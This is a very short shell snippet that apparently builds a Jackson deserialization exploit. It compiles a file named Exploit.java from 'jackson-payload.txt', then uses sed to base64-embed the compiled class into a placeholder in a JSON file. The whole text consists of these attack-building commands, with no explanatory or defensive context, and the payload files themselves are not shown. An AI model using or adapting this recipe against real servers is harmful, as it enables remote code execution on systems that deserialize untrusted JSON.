cp jackson-payload.txt Exploit.java
javac Exploit.java
sed s/AAIAZQ==/`cat Exploit.class|base64 -`/ json1.txt
